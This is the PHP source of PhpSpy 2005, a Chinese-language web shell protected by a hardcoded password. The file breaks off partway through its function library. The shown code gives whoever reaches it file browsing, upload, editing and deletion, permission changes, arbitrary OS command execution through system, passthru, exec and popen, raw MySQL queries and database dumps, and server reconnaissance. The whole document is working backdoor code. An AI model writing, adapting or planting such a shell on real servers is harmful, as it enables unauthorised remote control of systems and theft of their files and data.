<?php
/*
+--------------------------------------------------------------------------+
| str_replace("-", "", "P-h-p-S-p-y") Version:2005 Full                    |
| Codz by Angel                                                            |
| (c) 2004 Security Angel Team                                             |
| http://www.4ngel.net                                                     |
| ======================================================================== |
| Team:  http://www.4ngel.net                                              |
|        http://www.bugkidz.org                                            |
| Email: 4ngel@21cn.com                                                    |
| Date:  Dec 28st(My girl friend's birthday), 2004                         |
+--------------------------------------------------------------------------+
*/

error_reporting(7);
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];

/*===================== 程序配置 =====================*/

// 是否需要密码验证,1为需要验证,其他数字为直接进入.下面选项则无效
$admin['check']="1";

// 验证方式,1为采用 Session 验证,其他数字则采用 Cookie验证
// 默认采用 Session 验证,如果不能正常登陆,建议改为 Cookie验证
$admin['checkmode']="1";

// 如果需要密码验证,请修改登陆密码
$admin['pass']="angel";

/*===================== 配置结束 =====================*/


// 允许程序在 register_globals = off 的环境下工作
if ( function_exists('ini_get') ) {
	$onoff = ini_get('register_globals');
} else {
	$onoff = get_cfg_var('register_globals');
}
if ($onoff != 1) {
	@extract($_POST, EXTR_SKIP);
	@extract($_GET, EXTR_SKIP);
}

$self = $_SERVER['PHP_SELF'];

/*===================== 身份验证 =====================*/
if($admin['check']=="1") {
	if($admin['checkmode']=="1") {
	/*------- session 验证 -------*/
		session_start();
		if ($_GET['action'] == "logout") {
			session_destroy();
			echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
			echo "<span style=\"font-size: 12px; font-family: Verdana\">注销成功......<p><a href=\"".$self."\">三秒后自动退出或单击这里退出程序界面&gt;&gt;&gt;</a></span>";
			exit;
		}
		if ($login) {
			$adminpass=trim($_POST['adminpass']);
			if ($adminpass==$admin['pass']) {
				$_SESSION['adminpass'] = $admin['pass'];
				echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
				echo "<span style=\"font-size: 12px; font-family: Verdana\">登陆成功......<p><a href=\"".$self."\">三秒后自动跳转或单击这里进入程序界面&gt;&gt;&gt;</a></span>";
				exit;
			}
		}
		if (session_is_registered('adminpass')) {
			if ($_SESSION['adminpass']!=$admin['pass']) {
				loginpage();
			}
		} else {
			loginpage();
		}
	} else {
	/*------- cookie 验证 -------*/
		if ($_GET['action'] == "logout") {
			setcookie ("adminpass", "");
			echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
			echo "<span style=\"font-size: 12px; font-family: Verdana\">注销成功......<p><a href=\"".$self."\">三秒后自动退出或单击这里退出程序界面&gt;&gt;&gt;</a></span>";
			exit;
		}
		if ($login) {
			$adminpass=trim($_POST['adminpass']);
			if ($adminpass==$admin['pass']) {
				setcookie ("adminpass",$admin['pass'],time()+(1*24*3600));
				echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
				echo "<span style=\"font-size: 12px; font-family: Verdana\">登陆成功......<p><a href=\"".$self."\">三秒后自动跳转或单击这里进入程序界面&gt;&gt;&gt;</a></span>";
				exit;
			}
		}
		if (isset($_COOKIE['adminpass'])) {
			if ($_COOKIE['adminpass']!=$admin['pass']) {
				loginpage();
			}
		} else {
			loginpage();
		}
	}

}//end check
/*===================== 验证结束 =====================*/

// 判断 magic_quotes_gpc 状态
if (get_magic_quotes_gpc()) {
    $_GET = stripslashes_array($_GET);
	$_POST = stripslashes_array($_POST);
}

if ($_GET['action'] == "phpinfo") {
	$dis_func = get_cfg_var("disable_functions");
	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() 函数已被禁用,请查看&lt;PHP环境变量&gt;";
	exit;
}

// 下载文件
if (!empty($downfile)) {
	if (!@file_exists($downfile)) {
		echo "<script>alert('你要下的文件不存在!')</script>";
	} else {
		$filename = basename($downfile);
		$filename_info = explode('.', $filename);
		$fileext = $filename_info[count($filename_info)-1];
		header('Content-type: application/x-'.$fileext);
		header('Content-Disposition: attachment; filename='.$filename);
		header('Content-Description: PHP Generated Data');
		header('Content-Length: '.filesize($downfile));
		@readfile($downfile);
		exit;
	}
}



// 程序目录
$pathname=str_replace('\\','/',dirname(__FILE__)); 

// 获取当前路径
if (!isset($dir) or empty($dir)) {
	$dir = ".";
	$nowpath = getPath($pathname, $dir);
} else {
	$dir=$_GET['dir'];
	$nowpath = getPath($pathname, $dir);
}

// 判断读写情况
if (dir_writeable($nowpath)) {
	$dir_writeable = "可写";
} else {
	$dir_writeable = "不可写";
}

$dis_func = get_cfg_var("disable_functions");
$phpinfo=(!eregi("phpinfo",$dis_func)) ? " | <a href=\"?action=phpinfo\" target=\"_blank\">PHPINFO()</a>" : "";
$shellmode=(!get_cfg_var("safe_mode")) ? " | <a href=\"?action=shell\">WebShell</a>" : "";
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>PhpSpy Ver 2005</title>
<style type="text/css">
body,td {
	font-family: "sans-serif";
	font-size: "12px";
	line-height: "150%";
}
.smlfont {
	font-family: "sans-serif";
	font-size: "11px";
}
.INPUT {
	FONT-SIZE: "12px";
	COLOR: "#000000";
	BACKGROUND-COLOR: "#FFFFFF";
	height: "18px";
	border: "1px solid #666666";
}
.redfont {
	COLOR: "#A60000";
}
a:link,
a:visited,
a:active{
	color: "#000000";
	text-decoration: underline;
}
a:hover{
	color: "#465584";
	text-decoration: none;
}
.firstalt	{BACKGROUND-COLOR: "#EFEFEF"}
.secondalt	{BACKGROUND-COLOR: "#F5F5F5"}
</style>
<SCRIPT language=JavaScript>
function CheckAll(form)
{
	for (var i=0;i<form.elements.length;i++)
	{
		var e = form.elements[i];
		if (e.name != 'chkall')
		e.checked = form.chkall.checked;
    }
}
</SCRIPT>
</head>

<body style="table-layout:fixed; word-break:break-all">
<center>
<table width="760" border="0" cellpadding="3" cellspacing="0" bgcolor="#ffffff">
  <tr bgcolor="#cccccc">
    <td width="375" align="right" nowrap><b><?=$_SERVER['HTTP_HOST']?></b></td>
    <td width="10" align="center" nowrap><b>:</b></td>
    <td width="375" nowrap><b><?=$_SERVER['REMOTE_ADDR']?></b></td>
  </tr>
  <tr>
    <td colspan="3" align="center" nowrap><a href="?action=logout">注销会话</a> | <a href="?action=dir">返回 PhpSpy 目录</a> | <a href="?action=phpenv">PHP环境变量</a><?=$phpinfo?><?=$shellmode?> | <a href="?action=sql">SQL Query</a> | <a href="?action=sqlbak">MySQL Backup</a> | <a href="http://www.4ngel.net" target="_blank" title="下载此程序">Version 2005</a></td>
  </tr>
</table>
<hr width="760" noshade>
<table width="760" border="0" cellpadding="0">
 <form action="" method="GET">
  <tr>
    <td><p>程序路径:<?=$pathname?><br>当前目录(<?=$dir_writeable?>,<?=substr(base_convert(@fileperms($nowpath),10,8),-4);?>):<?=$nowpath?>
        <br>跳转目录:
        <input name="dir" type="text" class="INPUT">
        <input type="submit" class="INPUT" value="确定"> 〖支持绝对路径和相对路径〗
    </p></td>
  </tr>
 </form>
 <form action="?dir=<?=urlencode($dir)?>" method="POST" enctype="multipart/form-data">
  <tr>
    <td colspan="2">上传文件到当前目录:
      <input name="uploadmyfile" type="file" class="INPUT">	<input type="submit" name="uploadfile" class="INPUT" value="确定">
      <input type="hidden" name="uploaddir" value="<?=$dir?>"></td>
  </tr>
  </form>
  <form action="?action=editfile&dir=<?=urlencode($dir)?>" method="POST">
  <tr>
    <td colspan="2">新建文件在当前目录:
        <input name="newfile" type="text" class="INPUT" value="">
        <input type="submit" class="INPUT" name="createfile" value="确定"></td>
  </tr>
  </form>
  <form action="" method="POST">
  <tr>
    <td colspan="2">新建目录在当前目录:
        <input name="newdirectory" type="text" class="INPUT" value="">
        <input type="submit" class="INPUT" name="createdirectory" value="确定"></td>
  </tr>
  </form>
</table>
<hr width="760" noshade>
<?php
/*===================== 执行操作 开始 =====================*/
echo "<p><b>\n";
// 删除文件
if(@$delfile!="") {
	if(file_exists($delfile)) {
		if (@unlink($delfile)) {
			echo "".$delfile." 删除成功!";
		} else {
			echo "文件删除失败!";
		}
	} else {
		echo "文件已不存在,删除失败!";
	}
}

// 删除目录
elseif($rmdir) {
	if($deldir!="") {
		$deldirs="$dir/$deldir";
		if(!file_exists("$deldirs")) {
			echo "目录已不存在!";
		} else {
			deltree($deldirs);
		}
	} else {
		echo "删除失败!";
	}
}

// 创建目录
elseif($createdirectory) {
	if(!empty($newdirectory)) {
		$mkdirs="$dir/$newdirectory";
		if(file_exists("$mkdirs")) {
			echo "该目录已存在!";
		} else {
			echo $msg=@mkdir("$mkdirs",0777) ? "创建目录成功!" : "创建失败!";
			@chmod("$mkdirs",0777);
		}
	}
}

// 上传文件
elseif($uploadfile) {
	echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadmyfile']['name']."") ? "上传成功!" : "上传失败!";
}

// 编辑文件
elseif($doeditfile) {
	$filename="$editfilename";
	@$fp=fopen("$filename","w");
	echo $msg=@fwrite($fp,$_POST['filecontent']) ? "写入文件成功!" : "写入失败!";
	@fclose($fp);
}

// 编辑文件属性
elseif($editfileperm) {
	$fileperm=base_convert($_POST['fileperm'],8,10);
	echo $msg=@chmod($dir."/".$file,$fileperm) ? "属性修改成功!" : "修改失败!";
	echo " [".$file."] 修改后的属性为:".substr(base_convert(@fileperms($dir."/".$file),10,8),-4)."";
}

// 连接MYSQL
elseif($connect) {
	if (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {
		echo "数据库连接成功!";
		mysql_close();
	} else {
		echo mysql_error();
	}
}

// 执行SQL语句
elseif($doquery) {
	@mysql_connect($servername,$dbusername,$dbpassword) or die("数据库连接失败");
	@mysql_select_db($dbname) or die("选择数据库失败");
	$result = @mysql_query($_POST['sql_query']);
	echo ($result) ? "SQL语句成功执行" : "出错: ".mysql_error();
	mysql_close();
}

// 备份操作
elseif ($dobackup) {
	if (empty($_POST[table])) {
		echo "请选择欲备份的数据表";
	} else {
		@mysql_connect($servername,$dbusername,$dbpassword) or die("数据库连接失败");
		@mysql_select_db($dbname) or die("选择数据库失败");	
		$table = array_flip($_POST[table]);
		$filehandle = @fopen($path,"w");
		if ($filehandle) {
			$result = mysql_query("SHOW tables");
			echo ($result) ? NULL : "出错: ".mysql_error();
			while ($currow = mysql_fetch_array($result)) {
				if (isset($table[$currow[0]])) {
					sqldumptable($currow[0], $filehandle);
					fwrite($filehandle,"\n\n\n");
				}
			}
			fclose($filehandle);
			echo "数据库已成功备份到 <a href=\"".$path."\" target=\"_blank\">".$path."</a>";
			mysql_close();
		} else {
			echo "备份失败,请确认目标文件夹是否具有可写权限.";
		}
	}
}

// 打包下载 PS:文件太大可能非常慢
// Thx : 小花
elseif($downrar) {
	if ($dl != "") {
		$dfiles="";
		foreach ($dl AS $filepath=>$value) {
			$dfiles.=$filepath.",";
		}
		$dfiles=substr($dfiles,0,strlen($dfiles)-1);
		$dl=explode(",",$dfiles);

		$zip=new PHPZip($dl);
		$code=$zip->out;
		$filename=$_POST['rarfile'];
		
		header("Content-type: application/octet-stream");
		header("Accept-Ranges: bytes");
		header("Accept-Length: ".strlen($code));
		header("Content-Disposition: attachment;filename=".$filename);
		echo $code;
		exit;
	} else {
		echo "请选择要打包下载的文件.";
	}
}

// 查看PHP配置参数状况
elseif($viewphpvar) {
	echo "配置参数 ".$_POST['phpvarname']." 检测结果: ".getphpcfg($_POST['phpvarname'])."";
}

else {
	echo "本程序由 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel</a> 小组 angel [<a href=\"http://www.bugkidz.org\" target=\"_blank\">BST</a>] 独立开发,可在 <a href=\"http://www.4ngel.net\" target=\"_blank\">www.4ngel.net</a> 下载最新版本.";
}

echo "</b></p>\n";
/*===================== 执行操作 结束 =====================*/

if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == "dir")) {
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <tr bgcolor="#cccccc">
    <td align="center" nowrap width="30%"><b>文件</b></td>
	<td align="center" nowrap width="17%"><b>创建日期</b></td>
    <td align="center" nowrap width="17%"><b>最后修改</b></td>
    <td align="center" nowrap width="12%"><b>大小</b></td>
    <td align="center" nowrap width="7%"><b>属性</b></td>
    <td align="center" nowrap width="17%"><b>操作</b></td>
  </tr>
<?php
// 目录列表
$dirs=@opendir($dir);
while ($file=@readdir($dirs)) {
	$filepath="$dir/$file";
	$a=@is_dir($filepath);
	if($a=="1"){
		if($file!=".." && $file!=".")	{
			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
			$dirperm=substr(base_convert(fileperms($filepath),10,8),-4);
			echo "<tr class=".getrowbg().">\n";
			echo "  <td style=\"padding-left: 5px;\">[<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\"><font color=\"#006699\">$file</font></a>]</td>\n";
			echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">$ctime</td>\n";
			echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">$mtime</td>\n";
			echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">&lt;dir&gt;</td>\n";
			echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$dirperm</a></td>\n";
			echo "  <td align=\"center\" nowrap valign=\"top\"><a href=\"?action=deldir&dir=".urlencode($dir)."&deldir=".urlencode($file)."\">删除</a></td>\n";
			echo "</tr>\n";
			$dir_i++;
		} else {
			if($file=="..") {
				echo "<tr class=".getrowbg().">\n";
				echo "  <td nowrap colspan=\"6\" style=\"padding-left: 5px;\"><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">返回上级目录</a></td>\n";
				echo "</tr>\n";
			}
		}
	}
}//while
@closedir($dirs); 
?>
<tr bgcolor="#cccccc">
  <td colspan="6" height="5"></td>
</tr>
<FORM action="" method="POST">
<?
// 文件列表
$dirs=@opendir($dir);
while ($file=@readdir($dirs)) {
	$filepath="$dir/$file";
	$a=@is_dir($filepath);
	if($a=="0"){
		$size=@filesize($filepath);
		$size=$size/1024 ;
		$size= @number_format($size, 3);
		if (@filectime($filepath) == @filemtime($filepath)) {
			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
		} else {
			$ctime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filectime($filepath))."</span>";
			$mtime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filemtime($filepath))."</span>";
		}
		@$fileperm=substr(base_convert(@fileperms($filepath),10,8),-4);
		echo "<tr class=".getrowbg().">\n";
		echo "  <td style=\"padding-left: 5px;\"><INPUT type=checkbox value=1 name=dl[$filepath]><a href=\"$filepath\" target=\"_blank\">$file</a></td>\n";
		echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">$ctime</td>\n";
		echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">$mtime</td>\n";
		echo "  <td align=\"right\" nowrap valign=\"top\" class=\"smlfont\"><span class=\"redfont\">$size</span> KB</td>\n";
		echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$fileperm</a></td>\n";
		echo "  <td align=\"center\" nowrap valign=\"top\"><a href=\"?downfile=".urlencode($filepath)."\">下载</a> | <a href=\"?action=editfile&dir=".urlencode($dir)."&editfile=".urlencode($file)."\">编辑</a> | <a href=\"?dir=".urlencode($dir)."&delfile=".urlencode($filepath)."\">删除</a></td>\n";
		echo "</tr>\n";
		$file_i++;
	}
}
@closedir($dirs); 
?>
<tr class="<?=getrowbg()?>">
  <td nowrap colspan="6"><table width="100%" border="0" cellpadding="2" cellspacing="0" align="center">
    <tr>
      <td><INPUT onclick="CheckAll(this.form)" type="checkbox" value="on" name="chkall"> <input name="rarfile" type="text" class="INPUT" value="<?=$_SERVER['HTTP_HOST']?>_Files.rar"> <input type="submit" name="downrar" value="选中文件打包下载" class="INPUT"></td>
      <td align="right"><?=$dir_i?> 个目录 / <?=$file_i?> 个文件</td>
    </tr>
  </table></td>
</tr>
</FORM>
</table>

<?php
}// end dir

elseif ($_GET['action'] == "editfile") {
	if($newfile=="") {
		$filename="$dir/$editfile";
		$fp=@fopen($filename,"r");
		$contents=@fread($fp, filesize($filename));
		@fclose($fp);
		$contents=htmlspecialchars($contents);
	}else{
		$editfile=$newfile;
		$filename = "$dir/$editfile";
	}
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <tr class="firstalt">
    <td align="center">新建/编辑文件 [<a href="?dir=<?=urlencode($dir)?>">返回</a>]</td>
  </tr>
  <form action="?dir=<?=urlencode($dir)?>" method="POST">
  <tr class="secondalt">
    <td align="center">当前文件:<input class="input" type="text" name="editfilename" size="30"
value="<?=$filename?>"> 输入新文件名则建立新文件</td>
  </tr>  
  <tr class="firstalt">
    <td align="center"><textarea name="filecontent" cols="100" rows="20"><?=$contents?></textarea></td>
  </tr>  
  <tr class="secondalt">
    <td align="center"><input type="submit" name="doeditfile" value="确定写入" class="input">
      <input type="reset" value="重置" class="input"></td>
  </tr>
  </form>
</table>
<?php
}//end editfile

elseif ($_GET['action'] == "shell") {
	if (!get_cfg_var("safe_mode")) {
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <tr class="firstalt">
    <td align="center">WebShell Mode</td>
  </tr>
  <form action="?action=shell&dir=<?=urlencode($dir)?>" method="POST">
  <tr class="secondalt">
    <td align="center">提示:如果输出结果不完全,建议把输出结果写入文件.这样可以得到全部内容.</td>
  </tr>
  <tr class="firstalt">
    <td align="center">
	  选择执行函数:
	  <select name="execfunc" class="input">
		<option value="system" <? if ($execfunc=="system") { echo "selected"; } ?>>system</option>
		<option value="passthru" <? if ($execfunc=="passthru") { echo "selected"; } ?>>passthru</option>
		<option value="exec" <? if ($execfunc=="exec") { echo "selected"; } ?>>exec</option>
		<option value="shell_exec" <? if ($execfunc=="shell_exec") { echo "selected"; } ?>>shell_exec</option>
		<option value="popen" <? if ($execfunc=="popen") { echo "selected"; } ?>>popen</option>
	  </select>　
	  输入命令:
      <input type="text" name="command" size="60" value="<?=$_POST['command']?>" class="input">
      <input type="submit" value="execute" class="input"></td>
  </tr>  
  <tr class="secondalt">
    <td align="center"><textarea name="textarea" cols="100" rows="25" readonly><?php
	if (!empty($_POST['command'])) {
		if ($execfunc=="system") {
			system($_POST['command']);
		} elseif ($execfunc=="passthru") {
			passthru($_POST['command']);
		} elseif ($execfunc=="exec") {
			$result = exec($_POST['command']);
			echo $result;
		} elseif ($execfunc=="shell_exec") {
			$result=shell_exec($_POST['command']);
			echo $result;	
		} elseif ($execfunc=="popen") {
			$pp = popen($_POST['command'], 'r');
			$read = fread($pp, 2096);
			echo $read;
			pclose($pp);
		} else {
			system($_POST['command']);
		}
	}
	?></textarea></td>
  </tr>  
  </form>
</table>
<?php
	} else {
?>
<p><b>Safe_Mode 已打开, 无法执行系统命令.</b></p>
<?php
	}
}//end shell

elseif ($_GET['action'] == "deldir") {
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <form action="?dir=<?=urlencode($dir)?>" method="POST">
  <tr class="firstalt">
    <td align="center">删除 <input name="deldir" type="text" value="<?=$deldir?>" class="input" readonly> 目录</td>
  </tr>  
  <tr class="secondalt">
    <td align="center">注意:如果该目录非空,此次操作将会删除该目录下的所有文件.您确定吗?</td>
  </tr>  
  <tr class="firstalt">
    <td align="center">
	  <input type="submit" name="rmdir" value="delete" class="input">
	</td>
  </tr>  
  </form>
</table>
<?php
}//end deldir

elseif ($_GET['action'] == "fileperm") {
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <tr class="firstalt">
    <td align="center">修改文件属性 [<a href="?dir=<?=urlencode($dir)?>">返回</a>]</td>
  </tr>
  <form action="?dir=<?=urlencode($dir)?>" method="POST">
  <tr class="secondalt">
    <td align="center"><input name="file" type="text" value="<?=$file?>" class="input" readonly> 的属性为:
      <input type="text" name="fileperm" size="20" value="<?=substr(base_convert(fileperms($dir."/".$file),10,8),-4)?>" class="input">
	  <input name="dir" type="hidden" value="<?=urlencode($dir)?>">
	  <input type="submit" name="editfileperm" value="modify" class="input"></td>
  </tr>  
  </form>
</table>
<?php
}//end fileperm

elseif ($_GET['action'] == "sql") {
	$servername = isset($servername) ? $servername : 'localhost';
	$dbusername = isset($dbusername) ? $dbusername : 'root';
	$dbpassword = isset($dbpassword) ? $dbpassword : '';
	$dbname = isset($dbname) ? $dbname : '';
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <tr class="firstalt">
    <td align="center">执行 SQL 语句</td>
  </tr>
  <form action="?action=sql" method="POST">
  <tr class="secondalt">
    <td align="center">Host:
    <input name="servername" type="text" class="INPUT" value="<?=$servername?>"> 
    User:
    <input name="dbusername" type="text" class="INPUT" size="15" value="<?=$dbusername?>">
    Pass:
    <input name="dbpassword" type="text" class="INPUT" size="15" value="<?=$dbpassword?>">
    DB:
    <input name="dbname" type="text" class="INPUT" size="15" value="<?=$dbname?>">
    <input name="connect" type="submit" class="INPUT" value="连接"></td>
  </tr>
  <tr class="firstalt">
    <td align="center"><textarea name="sql_query" cols="85" rows="10"></textarea></td>
  </tr>
  <tr class="secondalt">
    <td align="center"><input type="submit" name="doquery" value="执行" class="input"></td>
  </tr>  
  </form>
</table>
<?php
}//end sql query

elseif ($_GET['action'] == "sqlbak") {
	$servername = isset($servername) ? $servername : 'localhost';
	$dbusername = isset($dbusername) ? $dbusername : 'root';
	$dbpassword = isset($dbpassword) ? $dbpassword : '';
	$dbname = isset($dbname) ? $dbname : '';
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <tr class="firstalt">
    <td align="center">备份 MySQL 数据库</td>
  </tr>
  <form action="?action=sqlbak" method="POST">
  <tr class="secondalt">
    <td align="center">Host:
    <input name="servername" type="text" class="INPUT" value="<?=$servername?>"> 
    User:
    <input name="dbusername" type="text" class="INPUT" size="15" value="<?=$dbusername?>">
    Pass:
    <input name="dbpassword" type="text" class="INPUT" size="15" value="<?=$dbpassword?>">
    DB:
    <input name="dbname" type="text" class="INPUT" size="15" value="<?=$dbname?>">
    <input name="connect" type="submit" class="INPUT" value="连接"></td>
  </tr>
  <?php
	@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname);
    $tables = @mysql_list_tables($dbname);
    while ($table = @mysql_fetch_row($tables)) {
		$cachetables[$table[0]] = $table[0];
    }
    @mysql_free_result($tables);

	if (empty($cachetables)) {
		echo "<tr>\n";
		echo "  <td align=\"center\" class=\"firstalt\"><b>您没有连接数据库 or 当前数据库没有任何数据表</b></td>\n";
		echo "</tr>\n";
	} else {
	?>
	<tr>
	  <td align="center" class="secondalt"><table border="0" cellpadding="3" cellspacing="1"><tr>
	  <td valign="top">请选择表:</td>
	  <td><select name="table[]" multiple size="15">
	<?php
	if (is_array($cachetables)) {
		foreach ($cachetables AS $key=>$value) {
			echo "<option value=\"$key\">$value</option>\n";
		}
	}
	?>
	</select></td>
	</tr>
	<tr nowrap>
	  <td>备份数据所保存的路径:</td>
	  <td><input type="text" class="INPUT" name="path" size="50" maxlength="50" value="./<?=$_SERVER['HTTP_HOST']?>_MySQL.sql"></td>
	</tr>
	</table></td>
	</tr>
	<tr>
	  <td align="center" class="firstalt"><input type="submit" name="dobackup" value="开始备份" class="INPUT"></td>
	</tr>
	<?php
	}
	echo "  </form>\n";
	echo "</table>\n";
	@mysql_close();
}//end sql backup

elseif ($_GET['action'] == "phpenv") {
	$upsize=get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "不允许上传";

	$adminmail=(isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";

	$dis_func = get_cfg_var("disable_functions");
	if ($dis_func == "") {
		$dis_func = "No";
	}else {
		$dis_func = str_replace(" ","<br>",$dis_func);
		$dis_func = str_replace(",","<br>",$dis_func);
	}
	
	$phpinfo=(!eregi("phpinfo",$dis_func)) ? "Yes" : "No";

	$info[0]  = array("服务器时间",date("Y年m月d日 h:i:s",time()));
	$info[1]  = array("服务器域名","<a href=\"http://$_SERVER[SERVER_NAME]\" target=\"_blank\">$_SERVER[SERVER_NAME]</a>");
	$info[2]  = array("服务器IP地址",gethostbyname($_SERVER['SERVER_NAME']));
	$info[3]  = array("服务器操作系统",PHP_OS);
	$info[5]  = array("服务器操作系统文字编码",$_SERVER['HTTP_ACCEPT_LANGUAGE']);
	$info[6]  = array("服务器解译引擎",$_SERVER['SERVER_SOFTWARE']);
	$info[7]  = array("Web服务端口",$_SERVER['SERVER_PORT']);
	$info[8]  = array("PHP运行方式",strtoupper(php_sapi_name()));
	$info[9]  = array("PHP版本",PHP_VERSION);
	$info[10] = array("运行于安全模式",getphpcfg("safemode"));
	$info[11] = array("服务器管理员",$adminmail);
	$info[12] = array("本文件路径",__FILE__);
	
	$info[13] = array("允许使用 URL 打开文件 allow_url_fopen",getphpcfg("allow_url_fopen"));
	$info[14] = array("允许动态加载链接库 enable_dl",getphpcfg("enable_dl"));
	$info[15] = array("显示错误信息 display_errors",getphpcfg("display_errors"));
	$info[16] = array("自动定义全局变量 register_globals",getphpcfg("register_globals"));
	$info[17] = array("magic_quotes_gpc",getphpcfg("magic_quotes_gpc"));
	$info[18] = array("程序最多允许使用内存量 memory_limit",getphpcfg("memory_limit"));
	$info[19] = array("POST最大字节数 post_max_size",getphpcfg("post_max_size"));
	$info[20] = array("允许最大上传文件 upload_max_filesize",$upsize);
	$info[21] = array("程序最长运行时间 max_execution_time",getphpcfg("max_execution_time")."秒");
	$info[22] = array("被禁用的函数 disable_functions",$dis_func);
	$info[23] = array("phpinfo()",$phpinfo);
	$info[24] = array("目前还有空余空间diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb');

	$info[25] = array("图形处理 GD Library",getfun("imageline"));
	$info[26] = array("IMAP电子邮件系统",getfun("imap_close"));
	$info[27] = array("MySQL数据库",getfun("mysql_close"));
	$info[28] = array("SyBase数据库",getfun("sybase_close"));
	$info[29] = array("Oracle数据库",getfun("ora_close"));
	$info[30] = array("Oracle 8 数据库",getfun("OCILogOff"));
	$info[31] = array("PREL相容语法 PCRE",getfun("preg_match"));
	$info[32] = array("PDF文档支持",getfun("pdf_close"));
	$info[33] = array("Postgre SQL数据库",getfun("pg_close"));
	$info[34] = array("SNMP网络管理协议",getfun("snmpget"));
	$info[35] = array("压缩文件支持(Zlib)",getfun("gzclose"));
	$info[36] = array("XML解析",getfun("xml_set_object"));
	$info[37] = array("FTP",getfun("ftp_login"));
	$info[38] = array("ODBC数据库连接",getfun("odbc_close"));
	$info[39] = array("Session支持",getfun("session_start"));
	$info[40] = array("Socket支持",getfun("fsockopen"));
?>
<table width="760" border="0" align="center" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
 <form action="?action=phpenv" method="POST">
  <tr class="firstalt">
    <td style="padding-left: 5px;"><b>查看PHP配置参数状况</b></td>
  </tr>
  <tr class="secondalt">
    <td style="padding-left: 5px;">请输入配置参数(如:magic_quotes_gpc):<input name="phpvarname" type="text" class="input" size="40"> <input type="submit" name="viewphpvar" value="查看" class="input"></td>
  </tr>
 </form>
<?php
	for($a=0;$a<3;$a++){
		if($a == 0){
			$hp = array("server","服务器特性");
		}elseif($a == 1){
			$hp = array("php","PHP基本特性");
		}elseif($a == 2){
			$hp = array("basic","组件支持状况");
		}
?>
  <tr class="firstalt">
    <td style="padding-left: 5px;"><b><?=$hp[1]?></b></td>
  </tr>
  <tr class="secondalt">
    <td>
      <table width="100%" border="0" cellpadding="0" cellspacing="0">
<?php
		if($a == 0){
			for($i=0;$i<=12;$i++){
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		}elseif($a == 1){
			for($i=13;$i<=24;$i++){
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		}elseif($a == 2){
			for($i=25;$i<=40;$i++){
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		}
?>
      </table>
    </td>
  </tr>
<?php
	}//for
echo "</table>";
}//end phpenv
?>
<hr width="760" noshade>
<table width="760" border="0" cellpadding="0">
  <tr>
    <td>Copyright (C) 2004 Security Angel Team [S4T] All Rights Reserved.</td>
    <td align="right"><?php
	debuginfo();
	ob_end_flush();	
	?></td>
  </tr>
</table>
</center>
</body>
</html>

<?php

/*======================================================
函数库
======================================================*/

	// 登陆入口
	function loginpage() {
?>
		<style type="text/css">
		input {
			font-family: "Verdana";
			font-size: "11px";
			BACKGROUND-COLOR: "#FFFFFF";
			height: "18px";
			border: "1px solid #666666";
		}
		</style>
		<form method="POST" action="">
		<span style="font-size: 11px; font-family: Verdana">Password: </span><input name="adminpass" type="password" size="20">
		<input type="submit" name="login" value="OK">
		</form>
<?php
		exit;
	}//end loginpage()

	// 页面调试信息
	function debuginfo() {
		global $starttime;
		$mtime = explode(' ', microtime());
		$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
		echo "Processed in $totaltime second(s)";
	}

	// 去掉转义字符
	function stripslashes_array(&$array) {
		while(list($key,$var) = each($array)) {
